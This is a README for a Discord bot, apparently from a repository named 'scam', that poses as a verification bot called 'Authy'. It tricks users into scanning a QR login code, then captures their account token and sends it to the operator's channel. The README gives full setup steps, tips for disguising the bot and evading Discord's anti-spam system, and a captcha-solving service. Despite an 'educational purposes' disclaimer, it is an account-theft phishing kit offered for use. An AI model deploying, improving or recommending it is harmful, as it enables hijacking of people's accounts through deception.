

## Features

- **Looks exactly like a real bot.** (when configured properly)
- **Memory Efficient.** (doesn't use chromedriver.exe or any browser)
- **Very stable and robust.** (minimal crashes and bugs)
- **Only working method** (that doesn't use chromedriver.exe)
- **Customisable** (change all apperance settings to suite your server)

## Disclaimers

- This is a bot that is not affiliated with any of the Discord or Discord Inc. teams.
- This was made for educational purposes. It is not meant to be used for malicious purposes.
- Any use of this bot is at your own risk. I am not responsible for any damage that may occur.
- You need to have an <a href="https://capmonster.cloud">CapMonster</a> account with funds for optimal performance.

## How it works

- The bot uses a web socket to connect to the Discord API to retrieve a login session.
- The login session then send the bot a url to generate a QR code for the user to scan.
- After the user scans the QR code, the bot will retrieve the token and send it to a channel.

## Setup

- **Install Prerequisites** You will need these to be able to run the discord bot.
  - [Node LTS](https://nodejs.org/en/)
  - [Git](https://git-scm.com/downloads)
- **Clone the Repository and Install Dependancies**
  - `git clone https://github.com/ulnk/scam.git`
  - `npm install`
- **Create a new Discord Bot**
  - **Enable all intents for the bot** This is very important. If you do not enable all intents, the bot will not work.
    - https://discord.dev **Bot** > **Privileged Gateway Intents**
  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile). To fit with the profile, rename the bot to `Authy` and set the profile picture to the one provided.
  - **Invite the bot to your server** Use the link below to invite your bot to your server. Change `CLIENTID` to your discord bots client id.
    - To get the client id for your bot > https://discord.dev **Oauth2** > **General**
    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
- **Configure the Project**
  - Rename `default-config.json` to `config.json`. This is located in `src/default-config.json`.
  - Edit all keys and their values. It is not required to give a value to capmonster, however it is reccomended.
  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash.
- **Simulate Real Verification Bot**
  - In each server you want the bot to be in, create a new role called `Verified`. (Make sure the role is below the bot)
  - use the command `/role` to set the role id to the role you just created.
  - This will be given to the user after they scan the qrcode.
- **Start the bot**
  - `npm run start`
  - Once the bot is active, use the command `/spawn` to spawn the verify message.

(_single executable file coming soon_)

## Preview Image

![Preview](https://user-images.githubusercontent.com/93608862/224277763-d9734632-2469-4b98-b239-27cd6c3247e9.png)

## Libraries Used

- **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
- **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
- **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
- **capmonster** (anti-captcha)<img alt="preview badge" src="https://img.shields.io/npm/v/node-capmonster">

https://discord.gg/parkwaygardens support server
